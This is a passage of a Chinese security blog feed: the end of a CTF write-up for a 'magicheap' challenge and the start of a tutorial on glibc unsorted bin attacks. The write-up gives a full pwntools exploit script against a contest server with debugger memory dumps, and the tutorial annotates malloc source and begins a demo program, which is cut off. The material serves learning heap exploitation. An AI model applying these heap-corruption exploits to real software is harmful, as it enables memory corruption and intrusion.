v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( heaparray[v1] )<br>  {<br>    <span class="hljs-built_in">free</span>(heaparray[v1]);<br>    heaparray[v1] = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>}<br></code></pre></td></tr></tbody></table></figure><p>正常free操作，指针清0，不存在uaf</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./magicheap'</span>)<br>p = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-number">29691</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, content</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>heap_ptr = <span class="hljs-number">0x6020E0</span><br>magic = <span class="hljs-number">0x6020C0</span><br>goal = magic - <span class="hljs-number">0x10</span><br><br><span class="hljs-comment"># 申请一个small chunk</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)<br>create(<span class="hljs-number">0x410</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">8</span>)   <span class="hljs-comment">#chunk0</span><br><span class="hljs-comment"># 申请一个chunk1防 chunk0 合并</span><br>create(<span class="hljs-number">500</span>,<span class="hljs-string">'c'</span>*<span class="hljs-number">8</span>)<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x421</span>) + p64(<span class="hljs-number">0</span>) + p64(goal)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x410</span>,<span class="hljs-string">"666"</span>)<br><span class="hljs-comment">#debug()</span><br>p.sendline(<span class="hljs-string">"4869"</span>)<br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h3 id="创建两个chunk"><a href="#创建两个chunk" class="headerlink" title="创建两个chunk"></a>创建两个chunk</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span><span class="hljs-comment">//chunk0</span><br><span class="hljs-number">0x1a65010</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x000000000000000a</span> <br><span class="hljs-number">0x1a65020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><span class="hljs-comment">//chunk1</span><br><span class="hljs-number">0x1a65030</span>:<span class="hljs-number">0x6262626262626262</span><span class="hljs-number">0x000000000000000a</span><br></code></pre></td></tr></tbody></table></figure><p>申请的 chunk(500) 以防止合并</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65440</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000201</span><span class="hljs-comment">//chunk3</span><br><span class="hljs-number">0x1a65450</span>:<span class="hljs-number">0x6363636363636363</span><span class="hljs-number">0x000000000000000a</span><br></code></pre></td></tr></tbody></table></figure><h3 id="free掉small-chunk，被放入到-unsorted-bin-中"><a href="#free掉small-chunk，被放入到-unsorted-bin-中" class="headerlink" title="free掉small-chunk，被放入到-unsorted-bin-中"></a>free掉small chunk，被放入到 unsorted bin 中</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span><br><span class="hljs-number">0x1a65010</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x000000000000000a</span><br><span class="hljs-number">0x1a65020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x1a65030</span>:<span class="hljs-number">0x00007f9bd595bb78</span><span class="hljs-number">0x00007f9bd595bb78</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">unsortedbin<br>all: <span class="hljs-number">0x1a65020</span> —▸ <span class="hljs-number">0x7f9bd595bb78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x1a65020</span><br></code></pre></td></tr></tbody></table></figure><p>被放入unsorted bin 中</p><p>观察全局变量</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x6020c0</span> &lt;magic&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020e0</span> &lt;heaparray&gt;:<span class="hljs-number">0x0000000001a65010</span><span class="hljs-number">0x0000000000000000</span><br>    #chunk1已经被<span class="hljs-built_in">free</span>掉<br><span class="hljs-number">0x6020f0</span> &lt;heaparray+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000001a65450</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h3 id="溢出到目的位置"><a href="#溢出到目的位置" class="headerlink" title="溢出到目的位置"></a>溢出到目的位置</h3><p>通过对chunk 0 进行溢出 修改 chunk1 的 bk 指针，到magic-0x10的位置</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x1a65000</span><br><span class="hljs-number">0x1a65000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span><br><span class="hljs-number">0x1a65010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x1a65020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x1a65030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00000000006020b0</span> <span class="hljs-comment">// bk -&gt; magic - 0x10</span><br></code></pre></td></tr></tbody></table></figure><h3 id="再申请一个-大小大于-small-chunk-且-小与刚刚-释放的chunk-的大小的-chunk"><a href="#再申请一个-大小大于-small-chunk-且-小与刚刚-释放的chunk-的大小的-chunk" class="headerlink" title="再申请一个-大小大于-small-chunk-且-小与刚刚-释放的chunk-的大小的-chunk"></a>再申请一个 大小大于 small chunk 且 小与刚刚 释放的chunk 的大小的 chunk</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x6020b0</span> &lt;<span class="hljs-built_in">stdin</span>@@GLIBC_2<span class="hljs-number">.2</span><span class="hljs-number">.5</span>&gt;:<span class="hljs-number">0x00007f9bd595b8e0</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020c0</span> &lt;magic&gt;:<span class="hljs-number">0x00007f9bd595bb78</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><p>可以看到magic 已经被改成了0x00007f9bd595bb78，这个值是main_arena+88</p><p>最后我们输入 4869 就可以打印flag 了</p><p>flag{unsorted_bin_attack}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;strong&gt;unsortedbin_attack（例题）&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&quot;查看保护&quot;&gt;&lt;a href=&quot;#查看保护&quot; class=&quot;headerlink&quot; title=&quot;查看保护&quot;&gt;&lt;/a&gt;查看保护&lt;/h2&gt;
&lt;p class=&#39;item-</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="unsoted bin attack" scheme="https://kylinxin.github.io/tags/unsoted-bin-attack/"/>
    
  </entry>
  
  <entry>
    <title>unsorted bin</title>
    <link href="https://kylinxin.github.io/2023/09/14/unsorted%20bin%20attack/"/>
    <id>https://kylinxin.github.io/2023/09/14/unsorted%20bin%20attack/</id>
    <published>2023-09-14T01:58:29.000Z</published>
    <updated>2023-09-13T12:59:08.891Z</updated>
    
    <content type="html"><![CDATA[<h1><strong>关于unsorted bin 和 unsorted bin attack</strong></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如<strong>修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放</strong>，又或者<strong>修改_IO_list_all来伪造_IO_FILE进行攻击</strong>。在上述攻击的利用过程中我们实际上并不需要对unsorted bin的分配过程有太多的了解。</p><blockquote><p>global_max_fast是main_arena中控制最大fastbin大小的变量。</p></blockquote><h2 id="unsotedbin-基本来源"><a href="#unsotedbin-基本来源" class="headerlink" title="unsotedbin-基本来源"></a><strong>unsotedbin 基本来源</strong></h2><p>1、当一个较大的（在bin中的）chunk（由于malloc）被分割成两半之后，如果剩下的部分大于<strong>MINSIZE</strong>，就会被放到unsortedbin中。</p><blockquote><p>举个例子，如有个0x90大小的 small chunk，此时malloc(0x60)，剩下的0x30由于大于 MINSIZE ，会被放入unsortedbin 中</p></blockquote><p>2、释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。<br>3、当进行malloc_consolidate时，如果不是和top_chunk近邻的话，可能会把合并后的chunk放到unsortedbin中。</p><blockquote><p>consolidate是一个动词，其中文意思为：使加强; 使巩固; (使) 结成一体，<strong>合并</strong>;<br>因此malloc_consolidate的意思是堆中的碎片整理，目的是为了减少堆中的碎片。</p></blockquote><h2 id="unsortedbin-attack-概述"><a href="#unsortedbin-attack-概述" class="headerlink" title="unsortedbin-attack-概述"></a>unsortedbin_attack 概述</h2><p>● Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。<br>● Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 <strong>bk</strong> <strong>指针</strong>。</p><h2 id="unsortedbin-attack-效果"><a href="#unsortedbin-attack-效果" class="headerlink" title="unsortedbin-attack-效果"></a>unsortedbin_attack 效果</h2><p>● <strong>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值，然后配合fastbin attack使用，达到任意地址写的效果。</strong></p><h2 id="unsortedbin-源码分析"><a href="#unsortedbin-源码分析" class="headerlink" title="unsortedbin-源码分析"></a>unsortedbin 源码分析</h2><blockquote><p>这里使用libc-2.23版本的源码<br>下面的源码不理解也没有关系（看看就好），这对利用unsortedbin这种攻击方式没有任何影响（）。<br>最重要的是最后的总结，记住就行了。</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs c">#源码的第<span class="hljs-number">3470</span>行<span class="hljs-number">-3597</span>行<br>         <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>#取链表尾部的chunk记作victim<br>        {<br>          bck = victim-&gt;bk;<br>          #倒数第二个chunk记作bck<br>          #接下来对victim的size位进行检查<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br>  #检查通过，计算victim得到实际chunk的大小<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>              #假如说我们申请的<span class="hljs-built_in">malloc</span>大小属于smallbin的范围，并且last_remainder是<br>              <span class="hljs-meta">#unsortedbin的唯一一个chunk时，优先使用这个chunk。</span><br>              <br>            {<br>              #假若满足条件则对其进行切割和解链操作<br>              <br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                {<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                }<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            }<br>  #如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。<br>          #其中unsorted_chunks (av)-&gt;bk = bck;<br>          <span class="hljs-meta">#bck-&gt;fd = unsorted_chunks (av);</span><br>          #是unsorted bin attack产生的原因，<br>          #一旦我们绕过之前的检查到达这里，<br>          #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)<br>          #即*(bck+<span class="hljs-number">0x10</span>)=unsorted(av)。<br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          <span class="hljs-meta">#unsortedbin产生的原因：</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>  #<br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br>      #如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。<br>          <span class="hljs-keyword">if</span> (size == nb)<br>            {<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            }<br>                  <br>          <span class="hljs-comment">/* place chunk in bin */</span><br>  #如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，<br>          #需要根据其size放入small bin或large bin的链，<br>          #其中在后者实现中存在large bin attack，<br>          #由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。<br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            {<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            }<br>          <span class="hljs-keyword">else</span><br>            {<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                {<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    {<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    }<br>                  <span class="hljs-keyword">else</span><br>                    {<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        {<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        }<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        {<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        }<br>                      bck = fwd-&gt;bk;<br>                    }<br>                }<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            }<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        }<br></code></pre></td></tr></tbody></table></figure><h2 id="unsortedbin-attack-原理"><a href="#unsortedbin-attack-原理" class="headerlink" title="unsortedbin-attack-原理"></a>unsortedbin_attack 原理</h2><p>从下面的源码中可以看到，当将一个unsortedbin取出时，会将bck-&gt;fd的位置写入本unsortedbin的位置</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#glibc-2.23/malloc/malloc.c</span><br><span class="hljs-comment">#源码第3515-3517行</span><br>  /* remove <span class="hljs-keyword">from</span> unsorted <span class="hljs-built_in">list</span> */<br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>//unsorted_chunks(av)其实是&amp;main_arena.top<br></code></pre></td></tr></tbody></table></figure><p>换而言之，如果我们控制了bk的值，我们就能将unsorted_chunk(av)写到任意地址。</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>接下来我们使用一个demo来演示unsortedbin_attack的原理：</p><blockquote><p>来源：<a href="https://www.yuque.com/hxfqg9/bin/tubv6q">https://www.yuque.com/hxfqg9/bin/tubv6q</a><br>感谢@yichen师傅的汉化<br>这个程序的目标是通过unsortedbin_attack将stack_var改成一个很大的值。</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n"</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n"</span>, &amp;stack_var, stack_var);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"一开始先申请一个比较正常的 chunk: %p\n"</span>,p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再分配一个避免与 top chunk 合并\n\n"</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 